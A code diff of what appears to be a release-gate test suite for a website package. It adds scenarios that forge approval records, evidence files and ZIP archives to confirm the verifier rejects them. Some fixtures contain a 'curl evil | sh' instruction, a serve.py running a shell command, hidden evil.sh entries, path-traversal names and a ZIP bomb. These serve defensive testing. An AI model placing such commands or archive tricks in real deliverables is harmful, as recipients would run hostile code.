@@ -6,7 +6,7 @@
 //   rg         the finding (RG-nn) the scenario is the blocking proof for; the check reports every finding's scenarios
 //   anything else failing is reported as collateral, anything missing from mustFail as a requirement that did NOT block
 // A "probe" does not assert; it records what the gate does with something it should arguably refuse, so that a gap is a measured fact.
-import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
+import { appendFileSync, existsSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { cpSync } from 'node:fs';
 import { createSandbox, PERSONA, SYNTH, TODAY } from './release-dryrun.mjs';
@@ -14,11 +14,13 @@ import { verifyPackage } from './release-package.mjs';
 import { buildManifest } from './hashed.mjs';
 import { unzipTo, zipBuffer } from './zip.mjs';
 import { listFiles, tempDir } from './git.mjs';
-import { isReservedHost } from '../../src/lib/seo.mjs';
+import { isReservedHost } from './hosts.mjs';
 import { assembleCandidate } from './site.mjs';
 import { loadReleasePolicy } from './release.mjs';
 import { loadPolicy as loadSecurityPolicy, renderHeadersFile } from './security.mjs';
 import { createHash } from 'node:crypto';
+import { sealOf } from './verification.mjs';
+import { fromParts } from './candidate.mjs';
 
 const sha = (b) => createHash('sha256').update(b).digest('hex');
 const REL = ['releaseApproval', 'productionHostAuthorised'];
@@ -77,6 +79,9 @@ export const GATE_SCENARIOS = [
   { g: 'domain', t: 'a reserved example domain (.test)', apply: base('https://jade.example.test'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
   { g: 'domain', t: 'a staging label in the host name (staging.)', apply: base('https://staging.jade-and-ember-fixture.com'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
   { g: 'domain', t: 'the domain changed after sign-off (committed, nothing re-recorded)', apply: (sb) => sb.committedUnbound(() => sb.json('config/client.json', (o) => { o.seo.baseUrl = 'https://www.changed-after-signoff.com'; })), mustFail: [...REL, 'rightsVerification', 'searchReadiness', 'verifyPassed', ...EV], mayFail: ['assetManifestCurrent'] },
+  { g: 'domain', t: 'a staging word inside a sub-domain label (jade-staging.)', apply: base('https://jade-staging.jade-and-ember-fixture.com'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
+  { g: 'domain', t: 'a numbered staging label (stage2.)', apply: base('https://stage2.jade-and-ember-fixture.com'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
+  { g: 'domain', t: 'another hosting provider\'s preview domain (azurestaticapps.net)', apply: base('https://jade-ember.azurestaticapps.net'), mustFail: ['productionDomain', 'productionHostAuthorised'] },
   { g: 'domain', t: 'a local address (https://localhost): the build refuses, or the gate does', apply: base('https://localhost'), mustFail: ['productionDomain', 'productionHostAuthorised'], error: /localhost|candidate build failed/, either: true },
   { g: 'domain', t: 'an IP address (https://192.0.2.10): the build refuses, or the gate does', apply: base('https://192.0.2.10'), mustFail: ['productionDomain', 'productionHostAuthorised'], error: /candidate build failed|IP/, either: true },
   // ---- rights verification and search review (RG-05, RG-07)
@@ -130,6 +135,31 @@ export const GATE_SCENARIOS = [
   { g: 'stays-valid', t: 'history: a rejection and an approval recorded for an older candidate', allow: true, apply: chg((sb) => { sb.put(sb.record('release-approval', { id: 'REL-JE-902', candidate: OTHER, status: 'rejected' })); }) },
   { g: 'stays-valid', t: 'two approvals of the same release by two authorised reviewers', allow: true, apply: add('release-approval', { id: 'REL-JE-902', decidedBy: SECOND_OWNER, decidedAt: `${TODAY()}T12:00:00Z` }) },
   { g: 'stays-valid', t: 'a positive record by an unauthorised person (not counted, harmless)', allow: true, apply: add('release-approval', { id: 'REL-JE-902', decidedBy: { reviewer: 'R-99', name: 'Nobody At All' } }) },
+  // ---- the record folders: a file the gate does not read must not be able to hide a rejection (review F3), identity and time are exact (F8)
+  { g: 'records', t: 'a REJECTION filed in deployments/ (the wrong family): it would never be read, so the folder refuses it', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); sb.put(r, 'deployments'); }), mustFail: ['recordsValid'] },
+  { g: 'records', t: 'a REJECTION filed in evidence/ (not an evidence record): refused, and evidence is not accepted beside it', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); writeFileSync(join(sb.evDir(), 'REL-JE-902.json'), JSON.stringify(r, null, 2)); }), mustFail: EV },
+  { g: 'records', t: 'a REJECTION saved as REL-JE-902.JSON (upper-case extension)', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); sb.put(r, 'approvals', 'REL-JE-902.JSON'); }), mustFail: ['recordsValid'] },
+  { g: 'records', t: 'a REJECTION saved as REL-JE-902.json.bak', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); sb.put(r, 'approvals', 'REL-JE-902.json.bak'); }), mustFail: ['recordsValid'] },
+  { g: 'records', t: 'a REJECTION in a sub-folder (approvals/old/REL-JE-902.json)', rg: 'RG-04', apply: chg((sb) => { const r = sb.record('release-approval', rejected('release-approval', 'REL-JE-902')); mkdirSync(join(sb.dir('approvals'), 'old'), { recursive: true }); writeFileSync(join(sb.dir('approvals'), 'old', 'REL-JE-902.json'), JSON.stringify(r, null, 2)); }), mustFail: ['recordsValid'] },
+  { g: 'records', t: 'a record that is a symlink to a file outside the repository', rg: 'RG-04', apply: chg((sb) => { const outside = join(sb.root, 'outside.json'); writeFileSync(outside, JSON.stringify(sb.record('release-approval', rejected('release-approval', 'REL-JE-902')))); symlinkSync(outside, join(sb.dir('approvals'), 'REL-JE-902.json')); }), mustFail: ['recordsValid'] },
+  { g: 'records', t: 'a REJECTION that exists in the working tree but git has been told to ignore (never committed)', rg: 'RG-04', apply: (sb) => { appendFileSync(join(sb.root, '.git', 'info', 'exclude'), 'jade-and-ember/engineering/release/approvals/REL-JE-902.json\n'); sb.put(sb.record('release-approval', rejected('release-approval', 'REL-JE-902'))); }, mustFail: ['recordsValid'], detail: /not committed/ },
+  { g: 'records', t: 'a record file that repeats a key ("status":"rejected" ... "status":"approved")', rg: 'RG-04', apply: chg((sb) => { const t = JSON.stringify(sb.record('release-approval', { id: 'REL-JE-902' }), null, 2).replace('{', '{\n  "status": "rejected",'); writeFileSync(join(sb.dir('approvals'), 'REL-JE-902.json'), t); }), mustFail: ['recordsValid'], detail: /duplicate key/ },
+  { g: 'records', t: 'a rejection filed under another record\'s file name (REL-JE-903.json holds REL-JE-902)', apply: chg((sb) => { sb.put(sb.record('release-approval', rejected('release-approval', 'REL-JE-902')), 'approvals', 'REL-JE-903.json'); }), mustFail: ['recordsValid'], detail: /file name must be the record id/ },
+  { g: 'records', t: 'a veto lifted by a reviewer who may revoke but could never have rejected (supersession is not a back door)', rg: 'RG-04', apply: chg((sb) => { const t = JSON.parse(readFileSync(join(sb.proj, 'engineering/release/reviewers.json'), 'utf8')); t.reviewers.push({ id: 'R-94', name: 'Dry-run Revoker Persona', role: 'synthetic dry-run persona (not a person)', mayApprove: [], mayReject: [], mayRevoke: ['release-approval'], validFrom: '2026-01-01', validTo: null }); sb.writeReviewers(t); sb.put(sb.record('release-approval', rejected('release-approval', 'REL-JE-902'))); sb.put(sb.record('release-approval', ending('release-approval', 'REL-JE-903', 'REL-JE-902', 'superseded', { decidedBy: { reviewer: 'R-94', name: 'Dry-run Revoker Persona' }, decidedAt: `${TODAY()}T11:00:00Z` }))); }), mustFail: [...REL, 'recordsValid'] },
+  { g: 'records', t: 'a decision time that does not exist (2026-02-30)', apply: mut(F.rel, (r) => { r.decidedAt = '2026-02-30T09:00:00Z'; }), mustFail: [...REL, 'recordsValid'] },
+  { g: 'records', t: 'a decision time of 24:00:00', apply: mut(F.rel, (r) => { r.decidedAt = `${TODAY()}T24:00:00Z`; }), mustFail: [...REL, 'recordsValid'] },
+  { g: 'records', t: 'a decision time with fractional seconds (ordering by text would be wrong)', apply: mut(F.rel, (r) => { r.decidedAt = `${TODAY()}T09:30:00.5Z`; }), mustFail: [...REL, 'recordsValid'] },
+  { g: 'records', t: 'an approval timed an hour from now (later today is still the future)', apply: mut(F.rel, (r) => { r.decidedAt = new Date(Date.now() + 3600e3).toISOString().slice(0, 19) + 'Z'; }), mustFail: [...REL, 'recordsValid'] },
+  { g: 'records', t: 'an array where a string belongs (candidate: ["…"])', apply: mut(F.rel, (r) => { r.candidate = [r.candidate]; }), mustFail: [...REL, 'recordsValid'] },
+  // ---- evidence has negative semantics too (review F7)
+  { g: 'evidence', t: 'a failed test of the same target recorded beside the passing one', rg: 'RG-08', apply: ev((sb) => { const e = sb.records.get('desktop-chrome'); const r = JSON.parse(JSON.stringify(e.record)); r.conclusion = 'failure'; r.attachments = []; writeFileSync(join(sb.evDir(), `desktop-chrome.${TODAY()}-b.json`), JSON.stringify(r, null, 2)); }), mustFail: ['evidence:browser-matrix'], detail: /FAILURE/ },
+  { g: 'evidence', t: 'a CI run of another repository', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.url = 'https://github.com/someone-else/other-repo/actions/runs/123456'; })), mustFail: ['evidence:ci-run'] },
+  { g: 'evidence', t: 'an evidence file that is not JSON at all, beside valid records', apply: ev((sb) => writeFileSync(join(sb.evDir(), 'zz-notes.json'), 'not json')), mustFail: EV },
+  { g: 'evidence', t: 'an evidence backup file (desktop-chrome.json.bak)', apply: ev((sb) => writeFileSync(join(sb.evDir(), 'desktop-chrome.json.bak'), '{}')), mustFail: EV },
+  // ---- what the candidate covers beyond the site files (review F1, F6)
+  { g: 'candidate', t: 'serve.py (run by the recipient, shipped in the ZIP) edited after sign-off, committed, nothing re-recorded', rg: 'RG-01', apply: (sb) => sb.committedUnbound(() => sb.edit('serve.py', (s) => `${s}\n# edited after sign-off\n`)), mustFail: ['verifyPassed', ...REL, 'rightsVerification', 'searchReadiness', ...EV] },
+  { g: 'candidate', t: 'shared source code the checks rely on (src/lib/seo.mjs) edited after verification', rg: 'RG-08', apply: (sb) => sb.committedUnbound(() => sb.edit('src/lib/seo.mjs', (s) => `${s}\n// edited after verification\n`)), mustFail: ['verifyPassed', 'evidence:ci-run'], detail: /different verification code/ },
+  { g: 'candidate', t: 'the CI workflow edited after verification', rg: 'RG-08', apply: (sb) => sb.committedUnbound(() => { const d = join(sb.root, '.github', 'workflows'); mkdirSync(d, { recursive: true }); writeFileSync(join(d, 'jade-and-ember-verify.yml'), 'name: edited\n'); }), mustFail: ['verifyPassed', 'evidence:ci-run'] },
   // ---- version, findings and configuration (committed, with the synthetic records re-bound, so the single defect stays single)
   { g: 'configuration', t: 'an open Blocker finding', apply: (sb) => sb.committed(() => sb.json('engineering/findings.json', (o) => o.findings.push({ id: 'F-DRY-1', check: 'dry-run', key: 'dry-run:blocker', severity: 'Blocker', visual: false, status: 'open', description: 'synthetic' }))), mustFail: ['noBlockingFindings'], detail: /F-DRY-1/ },
   { g: 'configuration', t: 'an open Major finding', apply: (sb) => sb.committed(() => sb.json('engineering/findings.json', (o) => o.findings.push({ id: 'F-DRY-2', check: 'dry-run', key: 'dry-run:major', severity: 'Major', visual: false, status: 'open', description: 'synthetic' }))), mustFail: ['noBlockingFindings'] },
@@ -167,7 +197,7 @@ export const GATE_SCENARIOS = [
   { g: 'evidence', t: 'an attachment that is not on disk', apply: ev((sb) => rmSync(join(sb.proj, evKey(sb, 'iphone-safari')))), mustFail: ['evidence:real-device'] },
   { g: 'evidence', t: 'an attachment whose bytes changed after it was hashed', apply: ev((sb) => writeFileSync(join(sb.proj, evKey(sb, 'android-chrome')), 'replaced')), mustFail: ['evidence:real-device'] },
   { g: 'evidence', t: 'one attachment reused by two records', apply: ev((sb) => sb.editRecord('android-chrome', (r) => { r.attachments[0] = { ...sb.records.get('iphone-safari').record.attachments[0] }; })), mustFail: ['evidence:real-device'] },
-  { g: 'evidence', t: 'a record file that is not valid JSON', apply: ev((sb) => writeFileSync(join(sb.evDir(), sb.records.get('desktop-chrome').file), '{ nope')), mustFail: ['evidence:browser-matrix'] },
+  { g: 'evidence', t: 'a record file that is not valid JSON', apply: ev((sb) => writeFileSync(join(sb.evDir(), sb.records.get('desktop-chrome').file), '{ nope')), mustFail: ['evidence:real-device', 'evidence:screen-reader', 'evidence:browser-matrix', 'evidence:ci-run'] },
   // ---- CI evidence: a summary of the verification record of the run, bound to the candidate (RG-08, RB-13)
   { g: 'ci-evidence', t: 'a CI record for another candidate artifact', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.build.candidate = OTHER; r.verification.candidate = OTHER; })), mustFail: ['evidence:ci-run'] },
   { g: 'ci-evidence', t: 'a CI record whose summary names another candidate than its build', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.verification.candidate = OTHER; })), mustFail: ['evidence:ci-run'] },
@@ -255,7 +285,7 @@ export function runPackageScenarios(sb) {
   const r1 = sb.tool(['prepare']);
   const rel = join(sb.proj, 'release');
   if (r1.status !== 0) { add('prepare on the fully green synthetic build', false, `exit ${r1.status}: ${r1.out.slice(-200)}`); return rows; }
-  const v = verifyPackage(rel);
+  const v = verifyPackage(rel, { eng: join(sb.proj, 'engineering') });
   add('prepare on the fully green synthetic build writes a package that verifies', v.ok, v.checks.map((c) => `${c.ok ? 'ok' : 'FAIL'} ${c.id}`).join(', '));
   const snap = (d) => listFiles(d).map((f) => `${sha(readFileSync(join(d, f)))}  ${f}`).join('\n');
   const first = snap(rel);
@@ -265,7 +295,7 @@ export function runPackageScenarios(sb) {
   const good = copyDir(rel);
   const run = (t, fn, mustFail, extra = {}) => {
     const d = copyDir(good);
-    try { fn(d); const res = verifyPackage(d); const failing = res.checks.filter((c) => !c.ok).map((c) => c.id); add(t, mustFail.every((m) => failing.includes(m)) && !res.ok, `failing: ${failing.join(', ') || 'none'}${failing.length ? ` — ${res.checks.find((c) => !c.ok).detail.slice(0, 110)}` : ''}`, extra); } finally { rmSync(d, { recursive: true, force: true }); }
+    try { fn(d); const res = verifyPackage(d, { eng: join(sb.proj, 'engineering') }); const failing = res.checks.filter((c) => !c.ok).map((c) => c.id); add(t, mustFail.every((m) => failing.includes(m)) && !res.ok, `failing: ${failing.join(', ') || 'none'}${failing.length ? ` — ${res.checks.find((c) => !c.ok).detail.slice(0, 110)}` : ''}`, extra); } finally { rmSync(d, { recursive: true, force: true }); }
   };
   const zipName = () => listFiles(good).find((f) => f.endsWith('.zip'));
   const rd = (d, n) => readFileSync(join(d, n)), wr = (d, n, b) => { mkdirSync(join(d, n, '..'), { recursive: true }); writeFileSync(join(d, n), b); };
@@ -313,18 +343,51 @@ export function runPackageScenarios(sb) {
   run('a CI evidence record removed from the package, manifest list updated', (d) => { rmSync(join(d, 'records/evidence', listFiles(join(d, 'records/evidence')).find((f) => f.startsWith('ci-run.')))); rehash(d, 'evidence'); }, ['evidence-recorded']);
   run('the verification record in the package edited (the seal breaks)', (d) => { const v = JSON.parse(rd(d, 'records/verification.json')); v.checks[0].seconds = 77; wr(d, 'records/verification.json', JSON.stringify(v, null, 2)); }, ['verification-record']);
   run('the client package carries the demonstration marker', (d) => manifest(d, (m) => { m.demonstration = { fictional: true, statement: 'FICTIONAL DEMONSTRATION: pretending to be a demonstration, which a client package must never carry.', registeredAs: null }; }), ['demonstration-marker'], { rg: 'RG-13' });
+  // ---- the container and the files beside the site (review F1, F2): every one of these is a ZIP that two extractors could read differently, or a file nothing hashed
+  const setZip = (d, z) => { wr(d, zipName(), z); manifest(d, (m) => { m.package.bytes = z.length; m.package.sha256 = sha(z); }); };   // package fields and checksums made consistent: only the container is wrong
+  const zipOf = (d) => Buffer.from(rd(d, zipName()));
+  const eocdOf = (b) => b.length - 22;
+  run('serve.py replaced inside the ZIP (package hash, checksums updated): the recipient would run it', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'serve.py'), 'import os\nos.system("echo pwned")\n')); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); }, ['package-extras']);
+  run('START-HERE.txt given an extra line ("Also run: curl evil | sh")', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'START-HERE.txt'), `${readFileSync(join(s, 'START-HERE.txt'), 'utf8')}Also run: curl evil | sh\n`)); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); }, ['package-extras']);
+  run('a ZIP that lists site.js twice (an evil copy first, the approved one last)', (d) => { const { site, z2 } = rezip(d, () => {}); rmSync(site, { recursive: true, force: true }); const names = []; const tmp = tempDir('dup'); try { const got = unzipTo(z2, tmp); for (const n of got) names.push({ name: n, data: readFileSync(join(tmp, n)) }); } finally { rmSync(tmp, { recursive: true, force: true }); } setZip(d, zipBuffer([{ name: 'site.js', data: Buffer.from('/* evil */') }, ...names])); }, ['zip']);
+  run('a ZIP with a comment and bytes after the end record (a streaming extractor sees more than the index)', (d) => setZip(d, Buffer.concat([zipOf(d), Buffer.from('#!/bin/sh\necho extra\n')])), ['zip']);
+  run('a ZIP with an extra local entry (evil.sh) the central directory does not list', (d) => {
+    const b = zipOf(d), e = eocdOf(b), cd = b.readUInt32LE(e + 16), name = Buffer.from('evil.sh'), data = Buffer.from('echo evil\n');
+    const h = Buffer.alloc(30); h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(20, 4); h.writeUInt32LE(data.length, 18); h.writeUInt32LE(data.length, 22); h.writeUInt16LE(name.length, 26);
+    const eo = Buffer.from(b.subarray(e)); eo.writeUInt32LE(cd + 30 + name.length + data.length, 16);
+    setZip(d, Buffer.concat([b.subarray(0, cd), h, name, data, b.subarray(cd, e), eo]));
+  }, ['zip']);
+  run('a ZIP whose local header names another file than the central directory (site.js here, evil.js there)', (d) => { const b = zipOf(d); const i = b.indexOf(Buffer.from('site.js')); b.write('evil.js', i); setZip(d, b); }, ['zip']);
+  run('a ZIP with two names that differ only in case (Site.js beside site.js)', (d) => { const { site, z2 } = rezip(d, () => {}); rmSync(site, { recursive: true, force: true }); const tmp = tempDir('case'); try { const got = unzipTo(z2, tmp).map((n) => ({ name: n, data: readFileSync(join(tmp, n)) })); setZip(d, zipBuffer([...got, { name: 'Site.js', data: Buffer.from('/* shadow */') }])); } finally { rmSync(tmp, { recursive: true, force: true }); } }, ['zip']);
+  run('a ZIP entry with a backslash in its name (a traversal on some extractors)', (d) => { const { site, z2 } = rezip(d, () => {}); rmSync(site, { recursive: true, force: true }); const tmp = tempDir('bs'); try { const got = unzipTo(z2, tmp).map((n) => ({ name: n, data: readFileSync(join(tmp, n)) })); setZip(d, zipBuffer([...got, { name: 'a\\..\\x.html', data: Buffer.from('<p>x</p>') }])); } finally { rmSync(tmp, { recursive: true, force: true }); } }, ['zip']);
+  run('a ZIP entry marked executable in the file attributes', (d) => { const b = zipOf(d); const i = b.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02])); b.writeUInt32LE(0x81ed0000, i + 38); setZip(d, b); }, ['zip']);
+  run('a ZIP entry that inflates to more than its declared size (a bomb)', (d) => { const b = zipOf(d); const i = b.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02])); b.writeUInt32LE(1, i + 24); setZip(d, b); }, ['zip']);
+  // ---- what the verifier no longer takes from the manifest (review F4)
+  run('the manifest\'s recorded gate lists no requirements and an open Blocker finding is added', (d) => manifest(d, (m) => { m.gate.requirements = []; m.findings.push({ id: 'F-DRY-9', severity: 'Blocker', visual: false, status: 'open' }); }), ['gate-recorded']);
+  run('the manifest\'s recorded gate lists a subset of the policy\'s requirements, all met', (d) => manifest(d, (m) => { m.gate.requirements = m.gate.requirements.slice(0, 3); }), ['gate-recorded']);
+  run('the verification record cut to one check, resealed, the manifest summary updated', (d) => { const v = JSON.parse(rd(d, 'records/verification.json')); v.checks = v.checks.slice(0, 1); v.seal = sealOf(v); wr(d, 'records/verification.json', JSON.stringify(v, null, 2)); manifest(d, (m) => { m.qa.report.seal = v.seal; m.qa.report.checks = m.qa.report.checks.slice(0, 1); }); }, ['verification-record']);
+  run('the manifest names another production host than the pages (the approval then names the manifest\'s host)', (d) => manifest(d, (m) => { m.configuration.baseUrl = 'https://www.another-restaurant.example/'; }), ['production-host']);
+  run('the package was judged by another reviewer table than this checkout\'s (a reviewer added, hash updated)', (d) => { const t = JSON.parse(rd(d, 'records/reviewers.json')); t.reviewers.push({ id: 'R-97', name: 'Added Persona', role: 'synthetic', mayApprove: ['release-approval'], mayReject: [], mayRevoke: [], validFrom: '2026-01-01', validTo: null }); wr(d, 'records/reviewers.json', JSON.stringify(t, null, 2)); manifest(d, (m) => { m.records.reviewers.sha256 = sha(rd(d, 'records/reviewers.json')); }); }, ['rules-match-repository']);
+  run('the evidence in the package: a CI record for a run of another repository, manifest list updated', (d) => { const f = listFiles(join(d, 'records/evidence')).find((x) => x.startsWith('ci-run.')); rec(d, 'evidence', f, (r) => { r.url = 'https://github.com/someone-else/other-repo/actions/runs/123456'; }); rehash(d, 'evidence'); }, ['evidence-recorded']);
+  run('the ZIP changed, the manifest\'s parts AND digest recomputed to match, the embedded records left bound to the old artifact', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'site.js'), `${readFileSync(join(s, 'site.js'), 'utf8')}\n/* forged */`)); const am = buildManifest(site); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { Object.assign(m.package, { bytes: z2.length, sha256: sha(z2) }); Object.assign(m.assets, { treeSha256: am.treeSha256, fileCount: am.fileCount, totalBytes: am.totalBytes }); m.candidate.parts = { ...m.candidate.parts, delivered: am.treeSha256 }; m.candidate.digest = fromParts(m.channel, m.version, m.candidate.parts).digest; }); }, ['approvals-recorded', 'verification-record'], { rg: 'RG-01' });
   // a probe: a complete, self-consistent forgery
   const d = copyDir(good);
   try {
     const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'site.js'), `${readFileSync(join(s, 'site.js'), 'utf8')}\n/* forged */`));
     const am = buildManifest(site); rmSync(site, { recursive: true, force: true });
     manifest(d, (m) => { Object.assign(m.package, { bytes: z2.length, sha256: sha(z2) }); Object.assign(m.assets, { treeSha256: am.treeSha256, fileCount: am.fileCount, totalBytes: am.totalBytes }); const parts = { ...m.candidate.parts, delivered: am.treeSha256 }; m.candidate.parts = parts; });
-    const res = verifyPackage(d);
+    const res = verifyPackage(d, { eng: join(sb.proj, 'engineering') });
     const failing = res.checks.filter((c) => !c.ok).map((c) => c.id);
-    add('the ZIP changed AND the manifest rewritten to match (the candidate digest is part of the lie as well): detected by the digest binding of the records, not by authorship', failing.includes('candidate-digest'), `rejected by ${failing.join(', ') || 'nothing'}: the recomputed digest differs from the one every embedded record names`);
-    // the residual: the digest, the records and the manifest all rewritten together by someone who can write the whole package
-    const m2 = JSON.parse(rd(d, 'release-manifest.json'));
-    add('PROBE (RG-14, open): the ZIP, the digest, every embedded record and the manifest all rewritten together by someone who can write the package', true, 'the checks prove consistency and binding, not authorship: no signature, no independent copy of the hashes (G6-2-DESIGN.md section 12 is the owner\'s decision)', { probe: true, finding: 'RG-14', observed: 'cannot be refused without a signature or an external attestation' });
+    add('the ZIP changed and the manifest\'s delivered-file part rewritten to match, the digest left: the recomputed digest differs', failing.includes('candidate-digest'), `rejected by ${failing.join(', ') || 'nothing'}: the recomputed digest differs from the one every embedded record names`);
+    // the residual, MEASURED: the artifact changed, then every approval, evidence record and verification re-bound to the new digest, and a package prepared by the real tool
+    // (what someone who controls the repository and the reviewer table can do). Every check is about consistency and binding, none about authorship.
+    sb.restore();
+    sb.committed(() => sb.edit('styles.css', (x) => `${x}\n/* a different artifact, re-bound end to end */\n`));
+    rmSync(rel, { recursive: true, force: true });
+    const forged = sb.tool(['prepare']);
+    const fv = forged.status === 0 ? verifyPackage(rel, { eng: join(sb.proj, 'engineering') }) : { ok: false, checks: [] };
+    add('PROBE (RG-14, open): a changed artifact with every record re-bound to it by whoever can write the repository', true, fv.ok ? 'the verifier PASSED it: consistency and binding are proved, authorship is not (no signature, no independent copy of the hashes; G6-2-DESIGN.md section 12 is the owner\'s decision)' : `refused: ${fv.checks.filter((c) => !c.ok).map((c) => c.id).join(', ') || `prepare exit ${forged.status}`}`, { probe: true, finding: 'RG-14', observed: fv.ok ? 'PASSED: cannot be refused without a signature or an external attestation' : 'refused' });
+    const m2 = null;
     void m2;
   } finally { rmSync(d, { recursive: true, force: true }); }
   rmSync(good, { recursive: true, force: true });
@@ -382,16 +445,19 @@ export function runChannelScenarios() {
       const rel = join(sb.proj, 'release');
       if (pr.status !== 0) add('prepare on the registered demonstration', false, `exit ${pr.status}: ${pr.out.slice(-200)}`);
       else {
-        const v = verifyPackage(rel);
+        const v = verifyPackage(rel, { eng: join(sb.proj, 'engineering') });
         add('prepare on the registered demonstration writes a package that verifies, with the marker', v.ok && v.checks.find((c) => c.id === 'demonstration-marker')?.ok, v.checks.map((c) => `${c.ok ? 'ok' : 'FAIL'} ${c.id}`).join(', '), { rg: 'RG-13' });
         const good = copyDir(rel), rd = (d, n) => readFileSync(join(d, n)), wr = (d, n, b) => writeFileSync(join(d, n), b);
         const sums = (d) => { const z = listFiles(d).find((f) => f.endsWith('.zip')); wr(d, 'SHA256SUMS.txt', ['release-manifest.json', z].map((n) => `${sha(rd(d, n))}  ${n}`).join('\n') + '\n'); };
         const manifest = (d, fn) => { const m = JSON.parse(rd(d, 'release-manifest.json')); fn(m); wr(d, 'release-manifest.json', JSON.stringify(m, null, 2) + '\n'); sums(d); };
-        const run = (t, fn, mustFail) => { const d = copyDir(good); try { fn(d); const res = verifyPackage(d); const failing = res.checks.filter((c) => !c.ok).map((c) => c.id); add(t, mustFail.every((m) => failing.includes(m)) && !res.ok, `failing: ${failing.join(', ') || 'none'}`, { rg: 'RG-13' }); } finally { rmSync(d, { recursive: true, force: true }); } };
+        const run = (t, fn, mustFail) => { const d = copyDir(good); try { fn(d); const res = verifyPackage(d, { eng: join(sb.proj, 'engineering') }); const failing = res.checks.filter((c) => !c.ok).map((c) => c.id); add(t, mustFail.every((m) => failing.includes(m)) && !res.ok, `failing: ${failing.join(', ') || 'none'}`, { rg: 'RG-13' }); } finally { rmSync(d, { recursive: true, force: true }); } };
         run('a demonstration package whose manifest drops the marker', (d) => manifest(d, (m) => { m.demonstration = null; }), ['demonstration-marker']);
         run('a demonstration package registered under an identity that is not in the registry', (d) => manifest(d, (m) => { m.demonstration.registeredAs = 'DEMO-JE-999'; }), ['demonstration-marker']);
         run('a demonstration package whose START-HERE.txt does not carry the statement', (d) => { /* START-HERE.txt is inside the ZIP, so the ZIP is rebuilt without the statement */ const site = tempDir('forge'); try { const names = unzipTo(rd(d, listFiles(d).find((f) => f.endsWith('.zip'))), site); writeFileSync(join(site, 'START-HERE.txt'), 'Open index.html.\n'); const z2 = zipBuffer(listFiles(site).map((name) => ({ name, data: readFileSync(join(site, name)) }))); const zn = listFiles(d).find((f) => f.endsWith('.zip')); wr(d, zn, z2); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); void names; } finally { rmSync(site, { recursive: true, force: true }); } }, ['channel-text']);
         run('a demonstration package that declares a production-looking domain', (d) => manifest(d, (m) => { m.search.baseUrlReserved = false; m.configuration.baseUrl = 'https://www.some-real-restaurant.com'; }), ['demonstration-marker']);
+        const editSite = (d, fn) => { const zn = listFiles(d).find((f) => f.endsWith('.zip')); const site = tempDir('forge'); try { const names = unzipTo(rd(d, zn), site); fn(site); const z2 = zipBuffer(listFiles(site).map((name) => ({ name, data: readFileSync(join(site, name)) }))); wr(d, zn, z2); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); void names; } finally { rmSync(site, { recursive: true, force: true }); } };
+        run('a demonstration page whose noindex robots tag was removed (client content passed off as the demonstration)', (d) => editSite(d, (s) => writeFileSync(join(s, 'index.html'), readFileSync(join(s, 'index.html'), 'utf8').replace(/<meta name="robots"[^>]*>/, ''))), ['demonstration-pages']);
+        run('a demonstration page that names a production host in a canonical link', (d) => editSite(d, (s) => writeFileSync(join(s, 'index.html'), readFileSync(join(s, 'index.html'), 'utf8').replace('</head>', '<link rel="canonical" href="https://www.some-real-restaurant.com/"></head>'))), ['demonstration-pages']);
         rmSync(good, { recursive: true, force: true });
       }
     } finally { sb.destroy(); }
